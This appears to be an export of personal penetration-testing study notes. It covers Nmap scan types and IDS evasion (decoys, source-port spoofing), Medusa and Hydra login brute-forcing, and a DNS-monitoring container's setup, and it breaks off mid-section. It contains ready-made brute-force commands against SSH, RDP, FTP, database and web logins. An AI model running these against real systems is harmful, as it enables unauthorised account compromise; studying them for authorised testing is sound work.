<li><a href="#mimikatz">mimikatz</a></li>
<li><a href="#msfvenom">msfvenom</a></li>
<li><a href="#nmap-1">nmap</a></li>
<li><a href="#pypykatz">pypykatz</a></li>
<li><a href="#rubeus">rubeus</a></li>
<li><a href="#unshadow">unshadow</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="need-to-addrefine"><a class="header" href="#need-to-addrefine">Need to add/refine:</a></h1>
<ul>
<li>
<p>Build for multiple platforms</p>
</li>
<li>
<p>Support consumption by other programs via stdout/stderr</p>
</li>
<li>
<p>rename directory structure</p>
<ul>
<li>Example: in getheaders, ./cmd/getHeaders should be ./cmd/cli</li>
</ul>
</li>
<li>
<p>finish
[ ] httpedia
[ ] httpbench
[ ] crayola
[ ] goal?
[ ] dnscache
[ ] podcrashcollector
[ ] dnsfixer
[ ] taint-remover
[ ] httpstat</p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="instructions-for-using-dnspinger"><a class="header" href="#instructions-for-using-dnspinger">instructions for using dnspinger</a></h1>
<p><em>Before deploying dnsPinger, you will want to create an App Insights workspace.</em></p>
<p>In this package, you will find a file named env.vars. This file contains a list of environment variables that will be passed to the container:</p>
<pre><code class="language-s">DNSPINGER_CUSTOM_DIMENSIONS=NodePool=mylaptop;env=local
DNSPINGER_DOMAINS=www.google.com;homedepot.aprimo.com;api.videoindexer.ai
DNSPINGER_REGION=us1
DNSPINGER_RESOLVERS=google=8.8.8.8;opendns=208.67.222.222;azure=168.63.129.16
APPINSIGHTS_INSTRUMENTATIONKEY=xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
</code></pre>
<p>The following section will explain these environment variables and their usage:</p>
<ul>
<li>DNSPINGER_CUSTOM_DIMENSIONS: A list of semi-colon (;) delimited key-value pairs. In addition to the other environment variables, these are passed to the Log Analytics <code>customEvents</code> table as customDimensions. The idea here was to include the name of the nodepool where this application is running and any other pertinent information.</li>
<li>DNSPINGER_DOMAINS: A semi-colon (;) delimited list of domains to resolve.</li>
<li>DNSPINGER_REGION: The region where the application is running. We implemented this because (as stated on our call), we are running AKS in 3 regions (Australia East, East US, and West Europe)</li>
<li>DNSPINGER_RESOLVERS: A list of semi-colon (;) delimited key-value pairs. The key is the name of a resolver (this is just an arbitrary string used for identification) and the value is the IP address of the resolver</li>
<li>APPINSIGHTS_INSTRUMENTATIONKEY: The App Insights instrumentation key where the logs can be uploaded to</li>
</ul>
<p>You can also view logs by tailing the pod:</p>
<pre><code>Found domain to resolve: www.google.com
[google]        Resolving www.google.com: 142.250.190.36
[opendns]       Resolving www.google.com: 142.250.191.196
[DotnetResolver]        Resolving www.google.com: 172.253.62.103,172.253.62.147,172.253.62.99,172.253.62.104,172.253.62.105,172.253.62.106
[DefaultResolver]       Resolving www.google.com: 172.253.62.103,172.253.62.147,172.253.62.99,172.253.62.104,172.253.62.105,172.253.62.106
Found domain to resolve: homedepot.aprimo.com
[google]        Resolving homedepot.aprimo.com: 52.255.216.147
[opendns]       Resolving homedepot.aprimo.com: 52.255.216.147
[DotnetResolver]        Resolving homedepot.aprimo.com: 52.255.216.147
[DefaultResolver]       Resolving homedepot.aprimo.com: 52.255.216.147
Found domain to resolve: api.videoindexer.ai
[google]        Resolving api.videoindexer.ai: 52.162.125.85
[opendns]       Resolving api.videoindexer.ai: 52.162.125.85
[DotnetResolver]        Resolving api.videoindexer.ai: 168.62.50.75
[DefaultResolver]       Resolving api.videoindexer.ai: 168.62.50.75
Found domain to resolve: www.microsoft.com
[google]        Resolving www.microsoft.com: 184.84.226.4
[opendns]       Resolving www.microsoft.com: 23.78.9.173
[DotnetResolver]        Resolving www.microsoft.com: 104.72.157.175
[DefaultResolver]       Resolving www.microsoft.com: 104.72.157.175
[MessagesSent]  0
[MessagesReceived]      0
[ErrorsSent]    0
[ErrorsReceived]        0
[EchoRequestsSent]      0
[EchoRequestsReceived]  0
[EchoRepliesSent]       0
[EchoRepliesReceived]   0
[DestinationUnreachableMessagesSent]    0
[DestinationUnreachableMessagesReceived]        0
[SourceQuenchesSent]    0
[SourceQuenchesReceived]        0
[RedirectsSent] 0
[RedirectsReceived]     0
[TimeExceededMessagesSent]      0
[TimeExceededMessagesReceived]  0
[ParameterProblemsSent] 0
[ParameterProblemsReceived]     0
[TimestampRequestsSent] 0
[TimestampRequestsReceived]     0
[TimestampRepliesSent]  0
[TimestampRepliesReceived]      0
[AddressMaskRequestsSent]       0
[AddressMaskRequestsReceived]   0
[AddressMaskRepliesSent]        0
[AddressMaskRepliesReceived]    0
</code></pre>
<p>You will also see some network statistics in the logs.</p>
<p>To run locally:
<code>docker run --env-file ./env.vars rnemethaprimo/dnspinger@latest</code></p>
<p>To run in Kubernetes:
Use the attached deployment.yaml (be sure to update the env vars accordingly)</p>
<h2 id="some-simple-la-queries-to-get-you-started"><a class="header" href="#some-simple-la-queries-to-get-you-started">Some simple LA queries to get you started:</a></h2>
<pre><code># get all failed queries in the last 10 minutes:

let t = 10m;
customEvents
| where timestamp &gt; ago(t)
| where customDimensions.Success == false

# get log entries for a resolver
customEvents
| where customDimensions.Resolver == "azure"

</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="nmap-1"><a class="header" href="#nmap-1">Nmap</a></h1>
<p>Understanding how Nmap works is critical for interpreting scan results. After confirming a host is alive, scanning helps identify:</p>
<ul>
<li>Open ports &amp; services</li>
<li>Service versions</li>
<li>Service information</li>
<li>Operating system details</li>
</ul>
<h2 id="port-states-6-total"><a class="header" href="#port-states-6-total">Port States (6 Total)</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>State</th><th>Meaning</th></tr>
</thead>
<tbody>
<tr><td><strong>open</strong></td><td>Target accepts connections (TCP/UDP/SCTP).</td></tr>
<tr><td><strong>closed</strong></td><td>Replies with <strong>RST</strong>; port reachable but no service.</td></tr>
<tr><td><strong>filtered</strong></td><td>No response or error; filtering prevents state determination.</td></tr>
<tr><td><strong>unfiltered</strong></td><td>Only in ACK scans; port reachable, state unknown.</td></tr>
<tr><td><strong>open|filtered</strong></td><td>No response; likely filtered or silently dropped.</td></tr>
<tr><td><strong>closed|filtered</strong></td><td>Only in idle scans; cannot determine closed vs filtered.</td></tr>
</tbody>
</table>
</div>
<hr>
<h1 id="tcp-scanning"><a class="header" href="#tcp-scanning">TCP Scanning</a></h1>
<h2 id="ack-scan--sa"><a class="header" href="#ack-scan--sa">ACK Scan (-sA)</a></h2>
<ul>
<li>Difficult for firewalls to detect.</li>
<li>TCP packet only has the ACK flag set, forcing a RST response from unfiltered ports.</li>
<li>Packets with the ACK flag set are usually used to acknowledge received data, so firewalls may not log them as suspicious or block them.</li>
</ul>
<h2 id="syn-scan--ss"><a class="header" href="#syn-scan--ss">SYN Scan (-sS)</a></h2>
<ul>
<li>Default when running as root.</li>
<li>Fast &amp; stealthy (half‚Äëopen).</li>
<li>Interprets SYN‚ÄëACK -&gt; open, RST -&gt; closed.</li>
</ul>
<h3 id="port-selection-examples"><a class="header" href="#port-selection-examples">Port selection examples</a></h3>
<ul>
<li><code>-p 22,80,445</code></li>
<li><code>-p 22-445</code></li>
<li><code>--top-ports=10</code></li>
<li><code>-p-</code></li>
<li><code>-F</code> (top 100)</li>
</ul>
<hr>
<h2 id="packet-tracing-packet-trace"><a class="header" href="#packet-tracing-packet-trace">Packet Tracing (‚Äìpacket-trace)</a></h2>
<p>Shows packets sent/received.<br>Example for closed port:</p>
<ul>
<li>SENT: SYN</li>
<li>RCVD: RST/ACK -&gt; closed</li>
</ul>
<hr>
<h1 id="tcp-connect-scan--st"><a class="header" href="#tcp-connect-scan--st">TCP Connect Scan (-sT)</a></h1>
<ul>
<li>Used when not root.</li>
<li>Completes full handshake.</li>
<li><strong>Most accurate, least stealthy</strong>.</li>
<li>Logged by services/IDS.</li>
<li>Useful when outbound connections allowed but inbound blocked.</li>
</ul>
<hr>
<h1 id="filtered-ports"><a class="header" href="#filtered-ports">Filtered Ports</a></h1>
<h3 id="dropped-packets"><a class="header" href="#dropped-packets">Dropped packets:</a></h3>
<ul>
<li>No reply -&gt; Nmap retries (default 10).</li>
<li>Slow scan.</li>
</ul>
<h3 id="rejected-packets"><a class="header" href="#rejected-packets">Rejected packets:</a></h3>
<ul>
<li>ICMP type 3 code 3 -&gt; port unreachable -&gt; likely firewall rejection.</li>
</ul>
<hr>
<h1 id="udp-scanning--su"><a class="header" href="#udp-scanning--su">UDP Scanning (-sU)</a></h1>
<ul>
<li>Slow due to long timeouts.</li>
<li>Many ports show <strong>open|filtered</strong> due to lack of responses.</li>
<li>Determining states:
<ul>
<li>UDP response -&gt; <strong>open</strong></li>
<li>ICMP type 3 code 3 -&gt; <strong>closed</strong></li>
<li>No response -&gt; <strong>open|filtered</strong></li>
</ul>
</li>
</ul>
<hr>
<h1 id="version-detection--sv"><a class="header" href="#version-detection--sv">Version Detection (-sV)</a></h1>
<p>Probes services to identify:</p>
<ul>
<li>Service name</li>
<li>Version</li>
<li>Extra metadata (workgroup, hostnames, OS hints)</li>
</ul>
<p>Example:<br>Identifies Samba <code>3.x‚Äì4.x</code> on port 445, workgroup WORKGROUP, OS Ubuntu.</p>
<p>nmap looks at the banners of the scanned services and prints them out and uses that to determine the version of the service. If it cannot identify the version through the banner, it will try to identify the service using a signature, but this is extremely noisy.</p>
<hr>
<h1 id="key-option-summary"><a class="header" href="#key-option-summary">Key Option Summary</a></h1>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>-Pn</code></td><td>Skip host discovery.</td></tr>
<tr><td><code>-n</code></td><td>Disable DNS resolution.</td></tr>
<tr><td><code>--disable-arp-ping</code></td><td>Skip ARP ping.</td></tr>
<tr><td><code>--packet-trace</code></td><td>Show packets sent/received.</td></tr>
<tr><td><code>--reason</code></td><td>Explain port state classification.</td></tr>
<tr><td><code>-F</code></td><td>Fast scan (top 100).</td></tr>
</tbody>
</table>
</div>
<hr>
<h1 id="timing"><a class="header" href="#timing">Timing</a></h1>
<p>Because such settings cannot always be optimized manually, as in a black-box penetration test, Nmap offers six different timing templates (-T &lt;0-5&gt;) for us to use. These values (0-5) determine the aggressiveness of our scans. This can also have negative effects if the scan is too aggressive, and security systems may block us due to the produced network traffic. The default timing template used when we have defined nothing else is the normal (-T 3).</p>
<pre><code class="language-sh">-T 0 / -T paranoid
-T 1 / -T sneaky
-T 2 / -T polite
-T 3 / -T normal
-T 4 / -T aggressive
-T 5 / -T insane
</code></pre>
<p>These templates contain options that we can also set manually, and have seen some of them already. The developers determined the values set for these templates according to their best results, making it easier for us to adapt our scans to the corresponding network environment. The exact used options with their values we can find here: https://nmap.org/book/performance-timing-templates.html</p>
<h1 id="decoys--d"><a class="header" href="#decoys--d">Decoys (-D)</a></h1>
<ul>
<li>Use decoy IP addresses to obfuscate the true source of the scan.</li>
<li>Example: <code>nmap -D RND:10 &lt;target&gt;</code> uses 10 random decoys along with the real IP.</li>
<li>The decoys must be routable and online from the target‚Äôs perspective.</li>
<li>Helps evade simple logging and detection mechanisms.</li>
<li>Decoys can be used with SYN, ACK, ICMP, and OS Detection scans.</li>
</ul>
<h1 id="source-port-specification-source-port"><a class="header" href="#source-port-specification-source-port">Source Port Specification (‚Äìsource-port)</a></h1>
<ul>
<li>Specify a different source port for the scan.</li>
<li>Example: <code>nmap -sS -Pn -p- --source-port 53 &lt;target&gt;</code></li>
</ul>
<h1 id="firewallids-evasion"><a class="header" href="#firewallids-evasion">Firewall/IDS Evasion</a></h1>
<ul>
<li>nmap provides a number of ways to evade firewalls and IDS systems. Including:</li>
<li>Fragmentation of packets</li>
<li>Decoy IP addresses</li>
<li>Using different source ports</li>
<li>Randomizing the order of port scans</li>
<li>Timing options to slow down scans</li>
<li>Using different scan techniques (e.g., Xmas scan, NULL scan)</li>
</ul>
<h1 id="core-takeaways"><a class="header" href="#core-takeaways">Core Takeaways</a></h1>
<ul>
<li>Nmap uses 6 port states to categorize behavior.</li>
<li>SYN scans are fast &amp; stealthy; connect scans are accurate but noisy.</li>
<li>Filtered ports behave differently when dropped vs rejected.</li>
<li>UDP scanning is slow and ambiguous.</li>
<li>Version detection is essential for deeper enumeration.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="medusa"><a class="header" href="#medusa">Medusa</a></h1>
<p>Medusa is a fast, massively parallel, and modular login brute-forcer designed to support a wide array of services that allow remote authentication. Its primary objective is to enable penetration testers and security professionals to assess the resilience of login systems against brute-force attacks.</p>
<p>Medusa‚Äôs key features include:</p>
<ul>
<li><strong>Speed and Parallelism</strong>: Utilizes multiple parallel connections to perform brute-force attacks efficiently</li>
<li><strong>Modularity</strong>: Supports numerous authentication protocols through dedicated modules</li>
<li><strong>Flexibility</strong>: Can target single hosts or multiple hosts from a file</li>
<li><strong>Ease of Use</strong>: Straightforward command-line interface with clear syntax</li>
</ul>
<hr>
<h2 id="installation-3"><a class="header" href="#installation-3">Installation</a></h2>
<p>Medusa often comes pre-installed on popular penetration testing distributions. You can verify its presence by running:</p>
<pre><code class="language-sh">medusa -h
</code></pre>
<p>Installing Medusa on a Linux system is straightforward:</p>
<pre><code class="language-sh">sudo apt-get -y update
sudo apt-get -y install medusa
</code></pre>
<hr>
<h2 id="command-syntax-1"><a class="header" href="#command-syntax-1">Command Syntax</a></h2>
<p>Medusa‚Äôs command-line interface follows this general structure:</p>
<pre><code class="language-sh">medusa [target_options] [credential_options] -M module [module_options]
</code></pre>
<hr>
<h2 id="target-options"><a class="header" href="#target-options">Target Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th><th>Example</th></tr>
</thead>
<tbody>
<tr><td><code>-h HOST</code></td><td>Specify a single target hostname or IP address</td><td><code>medusa -h 192.168.1.10 ...</code></td></tr>
<tr><td><code>-H FILE</code></td><td>Specify a file containing a list of targets</td><td><code>medusa -H targets.txt ...</code></td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="credential-options"><a class="header" href="#credential-options">Credential Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th><th>Example</th></tr>
</thead>
<tbody>
<tr><td><code>-u USERNAME</code></td><td>Provide a single username</td><td><code>medusa -u admin ...</code></td></tr>
<tr><td><code>-U FILE</code></td><td>Provide a file containing a list of usernames</td><td><code>medusa -U usernames.txt ...</code></td></tr>
<tr><td><code>-p PASSWORD</code></td><td>Specify a single password</td><td><code>medusa -p password123 ...</code></td></tr>
<tr><td><code>-P FILE</code></td><td>Specify a file containing a list of passwords</td><td><code>medusa -P passwords.txt ...</code></td></tr>
<tr><td><code>-e ns</code></td><td>Check for empty passwords (n) and passwords matching username (s)</td><td><code>medusa -e ns ...</code></td></tr>
</tbody>
</table>
</div>
<p>The <code>-e</code> option is useful for testing weak configurations:</p>
<ul>
<li><code>-e n</code>: Try empty passwords</li>
<li><code>-e s</code>: Try passwords matching the username</li>
<li><code>-e ns</code>: Try both empty and same-as-username passwords</li>
</ul>
<hr>
<h2 id="attack-options-1"><a class="header" href="#attack-options-1">Attack Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th><th>Example</th></tr>
</thead>
<tbody>
<tr><td><code>-M MODULE</code></td><td>Define the specific module to use for the attack</td><td><code>medusa -M ssh ...</code></td></tr>
<tr><td><code>-m "OPTION"</code></td><td>Provide additional parameters required by the chosen module</td><td><code>medusa -M http -m "POST /login.php..."</code></td></tr>
<tr><td><code>-t TASKS</code></td><td>Define the number of parallel login attempts to run</td><td><code>medusa -t 4 ...</code></td></tr>
<tr><td><code>-f</code></td><td>Fast mode: Stop the attack after the first successful login on current host</td><td><code>medusa -f ...</code></td></tr>
<tr><td><code>-F</code></td><td>Fast mode: Stop the attack after the first successful login on any host</td><td><code>medusa -F ...</code></td></tr>
<tr><td><code>-n PORT</code></td><td>Specify a non-default port for the target service</td><td><code>medusa -n 2222 ...</code></td></tr>
<tr><td><code>-v LEVEL</code></td><td>Verbose output: Display detailed information (0-6, higher = more verbose)</td><td><code>medusa -v 4 ...</code></td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="modules-1"><a class="header" href="#modules-1">Modules</a></h2>
<p>Each module in Medusa is tailored to interact with specific authentication mechanisms, allowing it to send the appropriate requests and interpret responses for successful attacks.</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Module</th><th>Service/Protocol</th><th>Description</th><th>Example Command</th></tr>
</thead>
<tbody>
<tr><td><code>ftp</code></td><td>File Transfer Protocol</td><td>Brute-forcing FTP login credentials, used for file transfers over a network</td><td><code>medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt</code></td></tr>
<tr><td><code>http</code></td><td>Hypertext Transfer Protocol</td><td>Brute-forcing login forms on web applications over HTTP (GET/POST)</td><td><code>medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&amp;password=^PASS^</code></td></tr>
<tr><td><code>imap</code></td><td>Internet Message Access Protocol</td><td>Brute-forcing IMAP logins, often used to access email servers</td><td><code>medusa -M imap -h mail.example.com -U users.txt -P passwords.txt</code></td></tr>
<tr><td><code>mysql</code></td><td>MySQL Database</td><td>Brute-forcing MySQL database credentials, commonly used for web applications and databases</td><td><code>medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt</code></td></tr>
<tr><td><code>pop3</code></td><td>Post Office Protocol 3</td><td>Brute-forcing POP3 logins, typically used to retrieve emails from a mail server</td><td><code>medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt</code></td></tr>
<tr><td><code>rdp</code></td><td>Remote Desktop Protocol</td><td>Brute-forcing RDP logins, commonly used for remote desktop access to Windows systems</td><td><code>medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt</code></td></tr>
<tr><td><code>ssh</code></td><td>Secure Shell (SSH)</td><td>Brute-forcing SSH logins, commonly used for secure remote access</td><td><code>medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt</code></td></tr>
<tr><td><code>svn</code></td><td>Subversion (SVN)</td><td>Brute-forcing Subversion (SVN) repositories for version control</td><td><code>medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt</code></td></tr>
<tr><td><code>telnet</code></td><td>Telnet Protocol</td><td>Brute-forcing Telnet services for remote command execution on older systems</td><td><code>medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt</code></td></tr>
<tr><td><code>vnc</code></td><td>Virtual Network Computing</td><td>Brute-forcing VNC login credentials for remote desktop access</td><td><code>medusa -M vnc -h 192.168.1.100 -P passwords.txt</code></td></tr>
<tr><td><code>web-form</code></td><td>Web Login Forms</td><td>Brute-forcing login forms on websites using HTTP POST requests</td><td><code>medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&amp;password=^PASS^:F=Invalid"</code></td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="common-usage-examples"><a class="header" href="#common-usage-examples">Common Usage Examples</a></h2>
<h3 id="ssh-brute-force-attack-1"><a class="header" href="#ssh-brute-force-attack-1">SSH Brute-Force Attack</a></h3>
<p>Target a single SSH server with username and password lists:</p>
<pre><code class="language-sh">medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh
</code></pre>
<p>This command instructs Medusa to:</p>
<ul>
<li>Target the host at 192.168.0.100</li>
<li>Use the usernames from the usernames.txt file</li>
<li>Test the passwords listed in the passwords.txt file</li>
<li>Employ the ssh module for the attack</li>
</ul>
<h3 id="multiple-web-servers-with-basic-http-authentication-1"><a class="header" href="#multiple-web-servers-with-basic-http-authentication-1">Multiple Web Servers with Basic HTTP Authentication</a></h3>
<p>Test multiple web servers concurrently:</p>
<pre><code class="language-sh">medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET
</code></pre>
<p>In this case, Medusa will:</p>
<ul>
<li>Iterate through the list of web servers in web_servers.txt</li>
<li>Use the usernames and passwords provided</li>
<li>Employ the http module with the GET method to attempt logins</li>
<li>Run multiple threads efficiently checking each server for weak credentials</li>
</ul>
<h3 id="testing-for-empty-or-default-passwords"><a class="header" href="#testing-for-empty-or-default-passwords">Testing for Empty or Default Passwords</a></h3>
<p>Assess whether any accounts have empty or default passwords:</p>
<pre><code class="language-sh">medusa -h 10.0.0.5 -U usernames.txt -e ns -M ssh
</code></pre>
<p>This command instructs Medusa to:</p>
<ul>
<li>Target the host at 10.0.0.5</li>
<li>Use the usernames from usernames.txt</li>
<li>Perform additional checks for empty passwords (<code>-e n</code>) and passwords matching the username (<code>-e s</code>)</li>
<li>Use the appropriate service module</li>
</ul>
<p>Medusa will try each username with an empty password and then with the password matching the username, potentially revealing accounts with weak or default configurations.</p>
<h3 id="http-post-form-attack-2"><a class="header" href="#http-post-form-attack-2">HTTP POST Form Attack</a></h3>
<p>Attack a web login form using POST requests:</p>
<pre><code class="language-sh">medusa -M http -h www.example.com -U users.txt -P passwords.txt -m "POST /login.php HTTP/1.1\r\nContent-Length: 30\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=^USER^&amp;password=^PASS^"
</code></pre>
<h3 id="custom-port-ssh-attack-1"><a class="header" href="#custom-port-ssh-attack-1">Custom Port SSH Attack</a></h3>
<p>Target SSH on a non-standard port:</p>
<pre><code class="language-sh">medusa -h 192.168.1.100 -n 2222 -U usernames.txt -P passwords.txt -M ssh
</code></pre>
<h3 id="fast-mode-stop-on-first-success-1"><a class="header" href="#fast-mode-stop-on-first-success-1">Fast Mode (Stop on First Success)</a></h3>
<p>Stop immediately after finding valid credentials:</p>
<pre><code class="language-sh">medusa -h 192.168.1.100 -U usernames.txt -P passwords.txt -M ssh -f
</code></pre>
<p>Use <code>-F</code> to stop after first success on any host when targeting multiple hosts.</p>
<h3 id="verbose-output-3"><a class="header" href="#verbose-output-3">Verbose Output</a></h3>
<p>Get detailed information about the attack progress:</p>
<pre><code class="language-sh">medusa -h 192.168.1.100 -U usernames.txt -P passwords.txt -M ssh -v 4
</code></pre>
<p>Higher verbosity levels (up to 6) provide more detailed output.</p>
<h3 id="parallel-tasks-1"><a class="header" href="#parallel-tasks-1">Parallel Tasks</a></h3>
<p>Control the number of parallel login attempts:</p>
<pre><code class="language-sh">medusa -h 192.168.1.100 -U usernames.txt -P passwords.txt -M ssh -t 8
</code></pre>
<p>Increasing the number of tasks can speed up the attack but may also increase the risk of detection or overwhelming the target service.</p>
<hr>
<h2 id="core-takeaways-1"><a class="header" href="#core-takeaways-1">Core Takeaways</a></h2>
<ul>
<li>Medusa uses parallel connections to efficiently brute-force login credentials across multiple protocols</li>
<li>Target options (<code>-h</code> or <code>-H</code>) specify hosts, while credential options (<code>-u</code>/<code>-U</code> and <code>-p</code>/<code>-P</code>) specify usernames and passwords</li>
<li>The <code>-e</code> option allows testing for weak configurations like empty passwords or passwords matching usernames</li>
<li>Module selection (<code>-M</code>) determines which authentication protocol to target</li>
<li>Use <code>-f</code> or <code>-F</code> to stop after the first successful login, saving time when valid credentials are found</li>
<li>Adjust <code>-t</code> to control parallel threads, balancing speed against detection risk</li>
<li>Module options (<code>-m</code>) may be required for complex scenarios like HTTP form attacks</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="hydra"><a class="header" href="#hydra">Hydra</a></h1>
<p>Hydra is a fast network login cracker that supports numerous attack protocols. It is a versatile tool that can brute-force a wide range of services, including web applications, remote login services like SSH and FTP, and even databases.</p>
<p>Hydra‚Äôs popularity stems from its:</p>
<ul>
<li><strong>Speed and Efficiency</strong>: Hydra utilizes parallel connections to perform multiple login attempts simultaneously, significantly speeding up the cracking process.</li>
<li><strong>Flexibility</strong>: Hydra supports many protocols and services, making it adaptable to various attack scenarios.</li>
<li><strong>Ease of Use</strong>: Hydra is relatively easy to use despite its power, with a straightforward command-line interface and clear syntax.</li>
</ul>
<hr>
<h2 id="installation-4"><a class="header" href="#installation-4">Installation</a></h2>
<p>Hydra often comes pre-installed on popular penetration testing distributions. You can verify its presence by running:</p>
<pre><code class="language-sh">hydra -h
</code></pre>
<p>If Hydra is not installed or you are using a different Linux distribution, you can install it from the package repository:</p>
<pre><code class="language-sh">sudo apt-get -y update
sudo apt-get -y install hydra
</code></pre>
<hr>
<h2 id="basic-syntax-6"><a class="header" href="#basic-syntax-6">Basic Syntax</a></h2>
<p>Hydra‚Äôs basic syntax is:</p>
<pre><code class="language-sh">hydra [login_options] [password_options] [attack_options] [service_options] service://server
</code></pre>
<hr>
<h2 id="login-options-1"><a class="header" href="#login-options-1">Login Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th><th>Example</th></tr>
</thead>
<tbody>
<tr><td><code>-l LOGIN</code></td><td>Specify a single username</td><td><code>hydra -l admin ...</code></td></tr>
<tr><td><code>-L FILE</code></td><td>Specify a file containing a list of usernames</td><td><code>hydra -L usernames.txt ...</code></td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="password-options-1"><a class="header" href="#password-options-1">Password Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th><th>Example</th></tr>
</thead>
<tbody>
<tr><td><code>-p PASS</code></td><td>Provide a single password</td><td><code>hydra -p password123 ...</code></td></tr>
<tr><td><code>-P FILE</code></td><td>Provide a file containing a list of passwords</td><td><code>hydra -P passwords.txt ...</code></td></tr>
<tr><td><code>-x MIN:MAX:CHARSET</code></td><td>Generate passwords dynamically</td><td><code>hydra -x 6:8:aA1 ...</code></td></tr>
</tbody>
</table>
</div>
<p>The <code>-x</code> option generates passwords on-the-fly:</p>
<ul>
<li><code>MIN:MAX</code> specifies the password length range</li>
<li><code>CHARSET</code> defines the character set to use (e.g., <code>a</code> for lowercase, <code>A</code> for uppercase, <code>1</code> for numbers)</li>
</ul>
<hr>
<h2 id="attack-options-2"><a class="header" href="#attack-options-2">Attack Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th><th>Example</th></tr>
</thead>
<tbody>
<tr><td><code>-t TASKS</code></td><td>Define the number of parallel tasks (threads) to run, potentially speeding up the attack</td><td><code>hydra -t 4 ...</code></td></tr>
<tr><td><code>-f</code></td><td>Fast mode: Stop the attack after the first successful login is found</td><td><code>hydra -f ...</code></td></tr>
<tr><td><code>-s PORT</code></td><td>Specify a non-default port for the target service</td><td><code>hydra -s 2222 ...</code></td></tr>
<tr><td><code>-v</code></td><td>Verbose output: Display detailed information about the attack‚Äôs progress</td><td><code>hydra -v ...</code></td></tr>
<tr><td><code>-V</code></td><td>Very verbose output: Display even more detailed information</td><td><code>hydra -V ...</code></td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="hydra-services"><a class="header" href="#hydra-services">Hydra Services</a></h2>
<p>Hydra services essentially define the specific protocols or services that Hydra can target. They enable Hydra to interact with different authentication mechanisms used by various systems, applications, and network services. Each module is designed to understand a particular protocol‚Äôs communication patterns and authentication requirements, allowing Hydra to send appropriate login requests and interpret the responses.</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Service</th><th>Protocol</th><th>Description</th><th>Example Command</th></tr>
</thead>
<tbody>
<tr><td><code>ftp</code></td><td>File Transfer Protocol (FTP)</td><td>Used to brute-force login credentials for FTP services, commonly used to transfer files over a network</td><td><code>hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100</code></td></tr>
<tr><td><code>ssh</code></td><td>Secure Shell (SSH)</td><td>Targets SSH services to brute-force credentials, commonly used for secure remote login to systems</td><td><code>hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100</code></td></tr>
<tr><td><code>http-get</code></td><td>HTTP GET</td><td>Used to brute-force login credentials for HTTP web login forms using GET requests</td><td><code>hydra -l admin -P /path/to/password_list.txt http-get://example.com/login</code></td></tr>
<tr><td><code>http-post</code></td><td>HTTP POST</td><td>Used to brute-force login credentials for HTTP web login forms using POST requests</td><td><code>hydra -l admin -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&amp;pass=^PASS^:F=incorrect"</code></td></tr>
<tr><td><code>smtp</code></td><td>Simple Mail Transfer Protocol</td><td>Attacks email servers by brute-forcing login credentials for SMTP, commonly used to send emails</td><td><code>hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com</code></td></tr>
<tr><td><code>pop3</code></td><td>Post Office Protocol (POP3)</td><td>Targets email retrieval services to brute-force credentials for POP3 login</td><td><code>hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com</code></td></tr>
<tr><td><code>imap</code></td><td>Internet Message Access Protocol</td><td>Used to brute-force credentials for IMAP services, which allow users to access their email remotely</td><td><code>hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com</code></td></tr>
<tr><td><code>rdp</code></td><td>Remote Desktop Protocol</td><td>Targets RDP services to brute-force credentials for remote desktop connections</td><td><code>hydra -l administrator -P /path/to/password_list.txt rdp://192.168.1.100</code></td></tr>
<tr><td><code>telnet</code></td><td>Telnet</td><td>Targets Telnet services for remote terminal access</td><td><code>hydra -l admin -P /path/to/password_list.txt telnet://192.168.1.100</code></td></tr>
<tr><td><code>mysql</code></td><td>MySQL</td><td>Targets MySQL database servers</td><td><code>hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100</code></td></tr>
<tr><td><code>postgres</code></td><td>PostgreSQL</td><td>Targets PostgreSQL database servers</td><td><code>hydra -l postgres -P /path/to/password_list.txt postgres://192.168.1.100</code></td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="http-form-based-authentication"><a class="header" href="#http-form-based-authentication">HTTP Form-Based Authentication</a></h2>
<p>For HTTP form-based authentication, Hydra uses a specific syntax:</p>
<pre><code>http-post-form "/path/to/login.php:field1=^USER^&amp;field2=^PASS^:failure_string"
</code></pre>
<ul>
